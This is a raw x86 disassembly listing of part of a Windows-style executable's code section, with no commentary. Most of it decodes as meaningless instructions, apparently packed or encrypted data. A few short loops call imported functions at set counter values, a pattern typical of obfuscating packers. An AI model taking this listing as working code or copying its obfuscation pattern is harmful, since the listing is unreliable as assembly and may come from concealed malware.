  40210f:	adc    eax,0x164909f1
  402114:	out    dx,eax
  402115:	adc    al,0x2c
  402117:	test   al,0xd6
  402119:	dec    esp
  40211a:	jnp    0x4020c6
  40211c:	repz push ecx
  40211e:	mov    bl,0xc3
  402120:	jl     0x4020a3
  402122:	cs jge 0x40218c
  402125:	pop    eax
  402126:	cs pop es
  402128:	loope  0x4020d1
  40212a:	fdivr  QWORD PTR [edx]
  40212c:	add    ebp,DWORD PTR [edi+0x3f4e213a]
  402132:	aam    0x84
  402134:	jo     0x4020bd
  402136:	imul   edi,DWORD PTR [esi-0x35],0x8e116aef
  40213d:	pusha  
  40213e:	xor    eax,0xb1291c52
  402143:	dec    edi
  402144:	mov    dh,0x9d
  402146:	jecxz  0x402144
  402148:	xchg   DWORD PTR [edi+0x50],ebx
  40214b:	scas   al,BYTE PTR es:[edi]
  40214c:	loope  0x4020ea
  40214e:	data16 ja 0x402136
  402151:	jl     0x4020e3
  402153:	sub    al,0xcd
  402155:	test   bh,bl
  402157:	fsub   QWORD PTR es:[ecx]
  40215a:	or     al,dl
  40215c:	sub    al,0x34
  40215e:	mov    WORD PTR [ecx-0x7c1461d2],gs
  402164:	shl    BYTE PTR [esi-0x9b8ff35],0x5c
  40216b:	or     edi,DWORD PTR [edx+0x15]
  40216e:	ja     0x402151
  402170:	in     al,dx
  402171:	cdq    
  402172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402173:	mov    bl,0x1e
  402175:	icebp  
  402176:	push   esp
  402177:	fmulp  st(2),st
  402179:	popf   
  40217a:	and    DWORD PTR [ebx+0x489daeca],0xcdd8f064
  402184:	mov    ebx,0x1501bc15
  402189:	das    
  40218a:	outs   dx,BYTE PTR ds:[esi]
  40218b:	mov    edi,cs
  40218d:	imul   eax,DWORD PTR [esi-0x59],0x34
  402191:	loop   0x4021cd
  402193:	and    DWORD PTR [edx-0x78e492cc],esp
  402199:	imul   esi,DWORD PTR [eax],0x23
  40219c:	cmp    eax,0xa3dcb2a3
  4021a1:	icebp  
  4021a2:	mov    dh,0xb6
  4021a4:	aaa    
  4021a5:	jg     0x40221a
  4021a7:	jl     0x4021b8
  4021a9:	mov    ebx,0xb9bf3bd4
  4021ae:	pop    ebx
  4021af:	xor    BYTE PTR [esi],bh
  4021b1:	ss pop esi
  4021b3:	retf   
  4021b4:	fs pop ss
  4021b6:	mov    bl,0x98
  4021b8:	ja     0x4021df
  4021ba:	icebp  
  4021bb:	jecxz  0x402214
  4021bd:	mov    ch,0x60
  4021bf:	out    dx,al
  4021c0:	out    0x5f,eax
  4021c2:	mov    edi,0x883cfced
  4021c7:	(bad)  
  4021c8:	shr    BYTE PTR [ecx-0x66],0x49
  4021cc:	repnz cdq 
  4021ce:	aam    0x4b
  4021d0:	dec    edx
  4021d1:	cwde   
  4021d2:	loopne 0x402253
  4021d4:	aad    0x5e
  4021d6:	and    DWORD PTR [eax+0x48f71fa6],0xffffffd3
  4021dd:	clc    
  4021de:	xlat   BYTE PTR ds:[ebx]
  4021df:	xor    eax,0x9625d8f4
  4021e4:	test   al,0x9
  4021e6:	mov    ds:0x760a7b87,al
  4021eb:	xor    DWORD PTR [edx+0x3f026393],esp
  4021f1:	mov    eax,edx
  4021f3:	cwde   
  4021f4:	mov    dl,0xde
  4021f6:	cmp    BYTE PTR [edi-0x25],0x7
  4021fa:	sbb    eax,0x9313eb09
  4021ff:	loop   0x402215
  402201:	sbb    eax,ebp
  402203:	sub    BYTE PTR [ecx-0x8],0x7d
  402207:	loopne 0x402238
  402209:	int    0x38
  40220b:	push   ecx
  40220c:	pop    edx
  40220d:	dec    esi
  40220e:	mov    edx,0xe039cc23
  402213:	sub    al,0x20
  402215:	add    edi,edi
  402217:	and    edx,DWORD PTR [ebp-0xc]
  40221a:	leave  
  40221b:	push   edx
  40221c:	mov    esp,0x5a41734e
  402221:	jno    0x402278
  402223:	daa    
  402224:	shl    DWORD PTR ds:0x5a78ce87,0xc7
  40222b:	aam    0xd2
  40222d:	(bad)  
  40222f:	rcr    DWORD PTR [eax-0x721ff454],cl
  402235:	xchg   DWORD PTR [ecx],eax
  402237:	inc    esp
  402238:	inc    esi
  402239:	pop    esp
  40223a:	sar    BYTE PTR [esi+eiz*8+0x32],1
  40223e:	mul    ch
  402240:	sbb    BYTE PTR [esi+esi*4+0x32c618a],dh
  402247:	lahf   
  402248:	push   edi
  402249:	cmc    
  40224a:	push   edx
  40224b:	lods   al,BYTE PTR ds:[esi]
  40224c:	jg     0x40229e
  40224e:	jo     0x40221d
  402250:	mov    edi,0xbc74debe
  402255:	inc    esp
  402256:	mov    eax,0x71be8c89
  40225b:	ror    DWORD PTR [edi+eiz*4-0x1c046e1c],cl
  402262:	and    BYTE PTR [ebx],0x87
  402265:	xlat   BYTE PTR ds:[ebx]
  402266:	xchg   esp,eax
  402267:	fcomp  QWORD PTR [ecx-0x69]
  40226a:	sbb    cl,BYTE PTR [ebx+0x1e]
  40226d:	mov    WORD PTR ds:0x4bc10af3,ds
  402273:	add    eax,0xf54c16fe
  402278:	test   BYTE PTR [edi+0x39],cl
  40227b:	push   edi
  40227c:	inc    edx
  40227d:	dec    esi
  40227e:	push   ss
  40227f:	cwde   
  402280:	and    edi,DWORD PTR [ebp+0x51]
  402283:	cmp    DWORD PTR [esi-0x6884cd86],edx
  402289:	stc    
  40228a:	inc    ebp
  40228b:	lock xor ah,BYTE PTR [eax+0x531a91b7]
  402292:	(bad)  
  402293:	lds    edx,FWORD PTR [ecx]
  402295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402296:	mov    DWORD PTR [edi+0x7c],eax
  402299:	cmp    DWORD PTR [esi+0x33],ebp
  40229c:	push   ebx
  40229d:	and    DWORD PTR [esp+esi*4-0x68e58403],esi
  4022a4:	push   0xe31cf4f1
  4022a9:	adc    BYTE PTR [eax+0x6ba6718b],dh
  4022af:	jnp    0x4022d6
  4022b1:	xbegin 0x1e0f3110
  4022b7:	mov    ch,0xac
  4022b9:	dec    edx
  4022ba:	jmp    0x3f2a:0x72e72fff
  4022c1:	inc    eax
  4022c2:	xchg   ebp,eax
  4022c3:	pop    edi
  4022c4:	dec    edi
  4022c5:	push   esp
  4022c6:	outs   dx,DWORD PTR ds:[esi]
  4022c7:	in     eax,dx
  4022c8:	xchg   ebp,eax
  4022c9:	fwait
  4022ca:	mov    dl,BYTE PTR [ecx-0x7f]
  4022cd:	and    eax,0x42ec6f
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	mov    edx,DWORD PTR ds:0x42ec6f
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ec6f,edx
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	inc    ecx
  402362:	les    edx,FWORD PTR [ecx+0x31]
  402365:	fild   DWORD PTR [ebx]
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x40238a
  40236e:	out    0x71,eax
  402370:	mov    eax,ds:0xee48cd8a
  402375:	or     eax,0xd32e1c5
  40237a:	test   eax,0x662e32ff
  40237f:	ret    0xd756
  402382:	cmp    DWORD PTR [ebp+0x51386107],eax
  402388:	pop    esi
  402389:	nop
  40238a:	ror    dl,0x13
  40238d:	xor    al,BYTE PTR [esi-0x6c]
  402390:	or     BYTE PTR [edx],bl
  402392:	xchg   esi,eax
  402393:	test   BYTE PTR [edx],ch
  402395:	dec    ebp
  402396:	jl     0x4023ed
  402398:	mov    gs,WORD PTR [ebx+0x20af2e4e]
  40239e:	xchg   DWORD PTR [edi-0x3bc4fe1f],ecx
  4023a4:	es pop ecx
  4023a6:	inc    ebx
  4023a7:	sbb    dl,ah
  4023a9:	les    eax,FWORD PTR [ecx+edx*8-0x3fb8e423]
  4023b0:	repz jb 0x40241f
  4023b3:	test   eax,0x9e842391
  4023b8:	or     cl,BYTE PTR [edx-0xcd5678d]
  4023be:	dec    ebp
  4023bf:	cmp    ch,dl
  4023c1:	sbb    al,0x6e
  4023c3:	xor    eax,0x4731ddf9
  4023c8:	jl     0x402427
  4023ca:	mov    ds:0xd6d8d2e0,al
  4023cf:	ret    
  4023d0:	pcmpgtb mm0,mm1
  4023d3:	hlt    
  4023d4:	sbb    dh,BYTE PTR [edi]
  4023d6:	pop    edi
  4023d7:	iret   
  4023d8:	xor    BYTE PTR [eax-0x3e],ch
  4023db:	loop   0x4023a3
  4023dd:	in     eax,dx
  4023de:	shl    BYTE PTR [ecx-0x54],0xd5
  4023e2:	iret   
  4023e3:	int3   
  4023e4:	jne    0x4023a1
  4023e6:	pop    ecx
  4023e7:	pop    esp
  4023e8:	mov    ebx,0xe4447b4
  4023ed:	outs   dx,DWORD PTR ds:[esi]
  4023ee:	aaa    
  4023ef:	jb     0x402397
  4023f1:	icebp  
  4023f2:	add    eax,0x27071657
  4023f7:	cmp    ecx,esp
  4023f9:	dec    ecx
  4023fa:	scas   al,BYTE PTR es:[edi]
  4023fb:	call   0x5d4d1551
  402400:	int3   
  402401:	add    al,BYTE PTR [esi]
  402403:	ss jmp 0xc48a4cd7
  402409:	and    BYTE PTR [edx+0x78e31247],al
  40240f:	and    al,0x6c
  402411:	sbb    edx,0xd18cc819
  402417:	pop    esp
  402418:	lock test eax,0x95d04c5a
  40241e:	xchg   ecx,eax
  40241f:	ins    DWORD PTR es:[edi],dx
  402420:	dec    edi
  402421:	int    0x5a
  402423:	inc    ebp
  402424:	stc    
  402425:	and    al,0x4f
  402427:	popf   
  402428:	jmp    0x4023ff
  40242a:	fstp   TBYTE PTR [ebx-0x5]
  40242d:	test   al,0xde
  40242f:	scas   eax,DWORD PTR es:[edi]
  402430:	push   esp
  402431:	mov    cl,0xf3
  402433:	jns    0x4024b4
  402435:	das    
  402436:	pop    esp
  402437:	out    0x24,al
  402439:	addr16 jb 0x402472
  40243c:	iret   
  40243d:	rol    BYTE PTR [ebp+ecx*4-0x6ce78ed],0x59
  402445:	inc    ecx
  402446:	jno    0x402424
  402448:	inc    ebp
  402449:	lds    esp,FWORD PTR [edi+esi*2-0x62df9489]
  402450:	pop    ds
  402451:	add    BYTE PTR [eax+eiz*8+0x4f66d42d],cl
  402458:	jg     0x40240e
  40245a:	mov    eax,0x24859f7a
  40245f:	dec    ebx
  402460:	dec    esi
  402461:	fisub  DWORD PTR fs:[esi]
  402464:	nop
  402465:	inc    DWORD PTR [edx+0x56ef94a4]
  40246b:	cli    
  40246c:	inc    edi
  40246d:	mov    WORD PTR [ecx],ss
  40246f:	test   al,0xfe
  402471:	xchg   edi,eax
  402472:	mov    es,WORD PTR [eax]
  402474:	adc    eax,0xa2a7df8a
  402479:	ret    0x56b
  40247c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40247d:	xor    DWORD PTR [esi+edx*4-0xac6e716],edx
  402484:	mov    al,BYTE PTR [edx]
  402486:	nop
  402487:	xchg   ebp,eax
  402488:	mov    ch,0xee
  40248a:	pop    ebp
  40248b:	rcr    BYTE PTR [edx],cl
  40248d:	nop
  40248e:	addr16 push ebp
  402490:	add    DWORD PTR [ecx-0x229b7413],esi
  402496:	mov    cs,WORD PTR [edx+edi*4-0x711aedd3]
  40249d:	sti    
  40249e:	fs push ss
  4024a0:	add    dl,bl
  4024a2:	pop    ecx
  4024a3:	ret    0x8d83
  4024a6:	arpl   WORD PTR [edx],di
  4024a8:	xor    edx,DWORD PTR [eax]
  4024aa:	imul   ebp,DWORD PTR [ebx+0x76c7cc90],0x253ffb79
  4024b4:	adc    al,0x4b
  4024b6:	cmp    ah,BYTE PTR [ecx]
  4024b8:	xchg   ebp,eax
  4024b9:	jmp    0xc9b63214
  4024be:	cmp    al,0xa
  4024c0:	es sub bh,dh
  4024c3:	test   eax,0x6a3f08ec
  4024c8:	ins    DWORD PTR es:[edi],dx
  4024c9:	test   eax,0x4fc02fd2
  4024ce:	mov    al,0x2
  4024d0:	lds    edi,FWORD PTR [eax+eiz*2]
  4024d3:	pushf  
  4024d4:	xchg   esi,edi
  4024d6:	aad    0xb5
  4024d8:	inc    esi
  4024d9:	scas   al,BYTE PTR es:[edi]
  4024da:	mov    al,0xcf
  4024dc:	loop   0x4024e1
  4024de:	pop    ss
  4024df:	ja     0x4024e1
  4024e1:	cwde   
  4024e2:	daa    
  4024e3:	xor    eax,0x4ca1ca5
  4024e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e9:	outs   dx,BYTE PTR ds:[esi]
  4024ea:	scas   al,BYTE PTR es:[edi]
  4024eb:	push   ebx
  4024ec:	int3   
  4024ed:	jne    0x402525
  4024ef:	loopne 0x402520
  4024f1:	push   ecx
  4024f2:	jo     0x40249b
  4024f4:	add    ax,0xe7da
  4024f8:	jge    0x402530
  4024fa:	popf   
  4024fb:	les    edx,FWORD PTR [eax+0x41]
  4024fe:	sbb    DWORD PTR [eax-0x5c],ecx
  402501:	cmp    BYTE PTR [ebx+0x44],ah
  402504:	ror    DWORD PTR [edi],1
  402506:	inc    edi
  402507:	test   eax,0x34cf2bbe
  40250c:	cmc    
  40250d:	out    0xc6,eax
  40250f:	into   
  402510:	inc    eax
  402511:	sub    eax,0x3ab7ed00
  402516:	retf   0xbc80
  402519:	mov    ecx,0x6e1edaa4
  40251e:	dec    esi
  40251f:	mov    al,es:0x9046cbb9
  402525:	pop    ebp
  402526:	cmp    al,0x2c
  402528:	lods   al,BYTE PTR ds:[esi]
  402529:	push   edi
  40252a:	cmp    eax,0x90b646ca
  40252f:	pushf  
  402530:	dec    eax
  402531:	pop    esi
  402532:	cld    
  402533:	jb     0x4024b9
  402535:	dec    ecx
  402536:	xor    al,0x5b
  402538:	mov    DWORD PTR [eax+ecx*8+0x3721aae],esp
  40253f:	and    BYTE PTR [esi+0x50],ch
  402542:	arpl   WORD PTR [ebx+0x44],sp
  402545:	sbb    eax,0x8151e7c8
  40254a:	and    eax,0x42ec4b
  40254f:	cmp    DWORD PTR [ebx],esi
  402551:	add    BYTE PTR [eax],al
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	les    ebx,FWORD PTR fs:[ecx]
  402614:	outs   dx,BYTE PTR ds:[esi]
  402615:	retf   0x13e
  402618:	jle    0x402698
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x40264f
  40261f:	xchg   ecx,eax
  402620:	ret    0xff3a
  402623:	lods   al,BYTE PTR ds:[esi]
  402624:	loop   0x4025df
  402626:	mov    bl,0x84
  402628:	adc    ah,al
  40262a:	ins    DWORD PTR es:[edi],dx
  40262b:	mov    esi,0xf79b922a
  402630:	outs   dx,BYTE PTR ds:[esi]
  402631:	cmp    DWORD PTR [edx],ebx
  402633:	inc    ebx
  402634:	sbb    DWORD PTR [esp],0xffffffc3
  402638:	push   esp
  402639:	(bad)  
  40263a:	and    eax,0x6b4d7928
  40263f:	in     eax,dx
  402640:	dec    esp
  402641:	pushf  
  402642:	sub    DWORD PTR [eax+0x720f1d1c],0xa
  402649:	inc    ecx
  40264a:	xor    DWORD PTR [edi],eax
  40264c:	ret    0xbcd1
  40264f:	push   0x1d4cdaa7
  402654:	repz das 
  402656:	call   0x42bf:0xea66050e
  40265d:	daa    
  40265e:	lods   al,BYTE PTR ds:[esi]
  40265f:	(bad)  
  402660:	push   esp
  402661:	ret    
  402662:	js     0x402603
  402664:	cmp    al,al
  402666:	arpl   cx,dx
  402668:	inc    esi
  402669:	sbb    ah,ah
  40266b:	push   esp
  40266d:	in     eax,dx
  40266e:	xor    bl,cl
  402670:	cmp    DWORD PTR [ecx-0x10669f02],0xe1cc884
  40267a:	in     eax,dx
  40267b:	test   BYTE PTR [eax],ch
  40267d:	cmc    
  40267e:	push   ebx
  40267f:	or     BYTE PTR [eax+esi*1],bl
  402682:	aaa    
  402683:	stos   BYTE PTR es:[edi],al
  402684:	sbb    eax,0x7f9ab791
  402689:	and    ah,ch
  40268b:	addr16 pop esp
  40268d:	(bad)  
  40268e:	push   esp
  40268f:	mov    ds:0xc55f2f11,eax
  402694:	rcl    DWORD PTR [ecx-0x5e93c93b],1
  40269a:	push   ecx
  40269b:	loop   0x4026e8
  40269d:	lahf   
  40269e:	mov    bl,0x68
  4026a0:	ficom  DWORD PTR [edi+0x2f]
  4026a3:	gs jmp 0xac94:0xebb41670
  4026ab:	or     DWORD PTR [ecx-0x29],esp
  4026ae:	in     al,dx
  4026af:	shr    BYTE PTR [esi],1
  4026b1:	mov    ebx,ebp
  4026b3:	pop    ds
  4026b4:	mov    ebx,0xc3a654f1
  4026b9:	push   ds
  4026ba:	add    bh,BYTE PTR [ecx+0x6aa20834]
  4026c0:	push   edi
  4026c1:	adc    al,0x40
  4026c3:	dec    eax
  4026c4:	mov    ebx,0x97088b36
  4026c9:	mov    al,0x25
  4026cb:	xchg   bl,bl
  4026cd:	add    ebx,DWORD PTR [ebp+0xb]
  4026d0:	add    ebp,edi
  4026d2:	(bad)  
  4026d3:	pop    dx
  4026d5:	pop    edx
  4026d6:	xor    DWORD PTR [edx-0x13],ebp
  4026d9:	mov    al,ds:0x789ec880
  4026de:	push   edx
  4026df:	jp     0x402758
  4026e1:	bound  esi,QWORD PTR [edx-0x75abdf82]
  4026e7:	lea    esp,[esi+0x44126def]
  4026ed:	xor    DWORD PTR [ebp+0x7f84551c],esi
  4026f3:	jl     0x40274a
  4026f5:	iret   
  4026f6:	cwde   
  4026f7:	mov    BYTE PTR [ebx+0x2c],al
  4026fa:	clc    
  4026fb:	ja     0x402700
  4026fd:	jnp    0x40273c
  4026ff:	fadd   QWORD PTR [edi+0x31879ae2]
  402705:	jmp    0xf4d748f9
  40270a:	xchg   BYTE PTR [edi+0x39],dl
  40270d:	mov    dl,0xfb
  40270f:	dec    edx
  402710:	and    dl,cl
  402712:	push   ecx
  402713:	fs adc bl,dh
  402716:	adc    al,0x70
  402718:	and    bl,cl
  40271a:	pop    edx
  40271b:	sbb    eax,0x19f6f9ba
  402720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402721:	lods   al,BYTE PTR ds:[esi]
  402722:	imul   edx,edi,0xb6d3c8cb
  402728:	cmc    
  402729:	pop    ebx
  40272a:	neg    edx
  40272c:	and    BYTE PTR [ebx+esi*2-0x3fc93492],ah
  402733:	pusha  
  402734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402736:	imul   esp,DWORD PTR [eax],0x7efbf83c
  40273c:	lds    esp,FWORD PTR [eax]
  40273e:	jns    0x402769
  402740:	mov    ecx,edi
  402742:	repz jl 0x40276e
  402745:	xor    eax,0x10993b8f
  40274a:	int    0xb7
  40274c:	mov    ebp,0x527b0b9e
  402751:	test   eax,0x68eabe2f
  402756:	dec    edx
  402757:	push   edi
  402758:	mov    BYTE PTR [eax-0x20],bh
  40275b:	sub    DWORD PTR [esi+0x5b],esi
  40275e:	pop    es
  40275f:	in     al,dx
  402760:	mov    ch,0x43
  402762:	or     ecx,DWORD PTR [ebp-0x4e287e63]
  402768:	xchg   ebp,eax
  402769:	inc    ebp
  40276a:	inc    edx
  40276b:	xor    BYTE PTR [edx-0x47b7e234],dl
  402771:	inc    ecx
  402772:	outs   dx,BYTE PTR ds:[esi]
  402773:	jle    0x4027a2
  402775:	push   eax
  402776:	mov    edx,0x70950767
  40277b:	fwait
  40277c:	mov    ds:0x1b4b205e,eax
  402781:	out    dx,eax
  402782:	call   0xe6bdb6d9
  402787:	sar    DWORD PTR [ebp+0x15142632],1
  40278d:	aam    0x56
  40278f:	and    DWORD PTR [ecx-0x19],ebx
  402792:	shl    DWORD PTR [ebx-0x69789260],1
  402798:	mov    edi,DWORD PTR [ebp+0x6b3be3ab]
  40279e:	(bad)  
  4027a0:	loop   0x4027cf
  4027a2:	(bad)  
  4027a3:	out    dx,eax
  4027a4:	mov    ds:0x566c8d95,eax
  4027a9:	jl     0x40275d
  4027ab:	jae    0x4027d7
  4027ad:	jle    0x4027ff
  4027af:	jecxz  0x402784
  4027b1:	int3   
  4027b2:	cmp    al,0xae
  4027b4:	pop    ds
  4027b5:	shl    DWORD PTR [ecx],1
  4027b7:	xchg   ebx,eax
  4027b8:	dec    eax
  4027b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ba:	mov    eax,ds:0xf938c64c
  4027bf:	or     ch,BYTE PTR [edi+0x6a]
  4027c2:	inc    esi
  4027c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027c4:	and    eax,0x583f5c9d
  4027c9:	int3   
  4027ca:	out    0xc7,al
  4027cc:	add    ebp,DWORD PTR ss:[ebp+0x7ee1264c]
  4027d3:	(bad)  [ebp-0x733fef69]
  4027d9:	jmp    0xe8628a7c
  4027de:	dec    eax
  4027df:	xchg   edx,eax
  4027e0:	inc    ecx
  4027e1:	das    
  4027e2:	mov    ds:0x77b0bc91,al
  4027e7:	mov    BYTE PTR [esi+0x2a],cl
  4027ea:	mov    DWORD PTR [ebp-0x600996b7],edx
  4027f0:	mov    esi,0xa8561a67
  4027f5:	ret    
  4027f6:	stc    
  4027f7:	or     al,0xd6
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [ebx-0x1e],ecx
  402829:	int3   
  40282a:	cmp    dl,BYTE PTR ds:0x557e7e0f
  402830:	jg     0x4028b0
  402832:	jle    0x4027f1
  402834:	scas   al,BYTE PTR es:[edi]
  402835:	xor    DWORD PTR [edx],ecx
  402837:	leave  
  402838:	and    eax,0xe1ccfe6c
  40283d:	mov    eax,0x7b705582
  402842:	xchg   ebx,eax
  402843:	out    0xb0,al
  402845:	fucomp st(2)
  402847:	jne    0x40289e
  402849:	shr    ebx,0xa2
  40284c:	xchg   DWORD PTR [edx-0x18],esp
  40284f:	adc    eax,0x5e8eec22
  402854:	bnd gs jo 0x4027fd
  402858:	add    eax,0xf65b42f8
  40285d:	in     al,0xe5
  40285f:	cmp    BYTE PTR [ecx-0x34],bl
  402862:	popf   
  402863:	call   0xe662:0x59f0f44a
  40286a:	test   BYTE PTR [edx-0x3e],bl
  40286d:	inc    edi
  40286e:	mov    dl,0xc9
  402870:	jg     0x402886
  402872:	out    dx,eax
  402873:	xor    al,0x56
  402875:	frstor [edx]
  402877:	push   eax
  402878:	xchg   edx,eax
  402879:	into   
  40287a:	mov    dh,0x70
  40287c:	sar    DWORD PTR [edi],0x64
  40287f:	adc    DWORD PTR [ecx-0x6d554b0b],0xb70a4026
  402889:	xchg   edx,eax
  40288a:	mov    bl,0xc1
  40288c:	aaa    
  40288d:	fsubr  DWORD PTR [esi+0x74]
  402890:	test   bh,bh
  402892:	lock leave 
  402894:	sub    bh,BYTE PTR [esi-0x2f]
  402897:	popa   
  402898:	jnp    0x402874
  40289a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40289b:	imul   esp,DWORD PTR [edi-0x473f1491],0x41f65c2a
  4028a5:	add    al,0x33
  4028a7:	jge    0x40286d
  4028a9:	adc    eax,edx
  4028ab:	in     al,0xc5
  4028ad:	xchg   esi,eax
  4028ae:	lods   al,BYTE PTR ds:[esi]
  4028af:	dec    eax
  4028b0:	sbb    al,ch
  4028b2:	into   
  4028b3:	pusha  
  4028b4:	cmp    BYTE PTR [ebx-0x454f58a1],ah
  4028ba:	jne    0x402900
  4028bc:	inc    BYTE PTR [edx-0x4f8150d2]
  4028c2:	jle    0x40293c
  4028c4:	or     eax,0x4adaffcb
  4028c9:	sbb    BYTE PTR [ecx-0x13],ch
  4028cc:	or     ebp,DWORD PTR [bp-0x21]
  4028d0:	mov    eax,0x69678aaa
  4028d5:	mov    eax,ds:0x937b39d4
  4028da:	inc    edx
  4028db:	lods   eax,DWORD PTR ds:[esi]
  4028dc:	jne    0x40294c
  4028de:	mov    eax,0xf276e573
  4028e3:	jmp    0xd496:0xc9eaa969
  4028ea:	popf   
  4028eb:	inc    esi
  4028ec:	fsub   st(7),st
  4028ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028ef:	clc    
  4028f0:	icebp  
  4028f1:	jmp    0x9d3c:0x95d5f597
  4028f8:	repz jo 0x402904
  4028fb:	loop   0x4028b2
  4028fd:	cmc    
  4028fe:	ins    DWORD PTR es:[edi],dx
  4028ff:	sahf   
  402900:	inc    ecx
  402901:	jbe    0x402906
  402903:	sbb    DWORD PTR [eax],0x493e76f1
  402909:	xor    DWORD PTR [eax+0x5fb2297b],edi
  40290f:	sbb    DWORD PTR [esi-0x6116a812],ebp
  402915:	jmp    0x30bab397
  40291a:	xchg   ebx,eax
  40291b:	js     0x40290b
  40291d:	nop    DWORD PTR [ebp+0x68510cc3]
  402924:	or     edx,DWORD PTR [esi-0x54]
  402927:	jmp    0x402908
  402929:	sbb    BYTE PTR [ebp-0x1b],0xf3
  40292d:	or     al,0xcb
  40292f:	lahf   
  402930:	xchg   esi,eax
  402931:	rol    DWORD PTR [ebp+0x3d],cl
  402934:	fisubr DWORD PTR [eax-0x2c]
  402937:	test   al,0xa1
  402939:	inc    ebp
  40293a:	scas   al,BYTE PTR es:[edi]
  40293b:	(bad)  
  40293d:	fadd   QWORD PTR [edx+0x5c]
  402940:	ins    BYTE PTR es:[edi],dx
  402941:	push   ebp
  402942:	loop   0x402986
  402944:	fadd   QWORD PTR [ecx]
  402946:	push   edx
  402947:	out    0x8,eax
  402949:	pop    edx
  40294a:	outs   dx,DWORD PTR ds:[esi]
  40294b:	mov    cl,0x7f
  40294d:	and    DWORD PTR [ecx-0x4b7e0955],eax
  402953:	lods   al,BYTE PTR ds:[esi]
  402954:	mov    esp,0x88f8cae0
  402959:	dec    ebx
  40295a:	lea    ebp,[ebx+0x7ea1f214]
  402960:	cmp    al,0x16
  402962:	xchg   esi,eax
  402963:	cmp    eax,0xd9f4b02b
  402968:	aaa    
  402969:	jl     0x402926
  40296b:	cmc    
  40296c:	jae    0x402920
  40296e:	das    
  40296f:	ss xchg esi,eax
  402971:	mov    ah,0xcf
  402973:	push   ebx
  402974:	add    BYTE PTR [eax+ecx*1+0x23],al
  402978:	push   edx
  402979:	jnp    0x4029a4
  40297b:	mov    BYTE PTR [ecx],dl
  40297d:	adc    ah,BYTE PTR [ecx+eiz*1]
  402980:	pop    esi
  402981:	pop    es
  402982:	add    edi,DWORD PTR [ebp+ebp*8+0x1c]
  402986:	pop    ebp
  402987:	cmp    eax,0x3962817a
  40298c:	scas   eax,DWORD PTR es:[edi]
  40298d:	dec    ecx
